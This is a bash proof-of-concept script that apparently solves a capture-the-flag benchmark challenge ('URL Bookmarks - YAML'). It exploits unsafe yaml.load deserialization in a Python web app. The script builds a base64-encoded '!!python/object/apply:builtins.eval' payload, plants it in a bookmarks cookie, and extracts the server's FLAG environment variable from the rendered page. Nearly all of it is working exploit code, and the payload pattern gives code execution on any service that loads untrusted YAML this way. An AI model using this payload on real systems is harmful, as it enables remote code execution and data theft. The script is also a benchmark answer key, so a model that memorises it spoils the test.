#!/usr/bin/env bash
# XBEN-075-24 — "URL Bookmarks - YAML" (tags: insecure_deserialization)
#
# The same application as XBEN-057 with `pickle` swapped for `yaml.load(...,
# Loader=yaml.Loader)`. That loader is the unsafe one: `!!python/object/apply`
# calls whatever it names. Changing the serialisation format changed nothing
# about the bug, which is the point of keeping both examples.
#
# As in XBEN-057, the payload has to return the shape the *template* reads:
# `item.name`. A payload that returns the flag as a string renders nothing,
# because iterating a string yields characters and characters have no `.name`.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben075-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

BOOKMARKS="$(python3 -c "
import base64
payload = '''!!python/object/apply:builtins.eval [\"[type('X',(),{'name':__import__('os').environ['FLAG'],'url':'#'})()]\"]'''
print(base64.b64encode(payload.encode()).decode())")"

"$H5I" browser open "$URL/list" --session "$SESSION" --new --capture >/dev/null
REPLAY="$("$H5I" websec replay req_0 --create \
    --set "cookie.bookmarks=$BOOKMARKS" --set "cookie.user=poc" \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
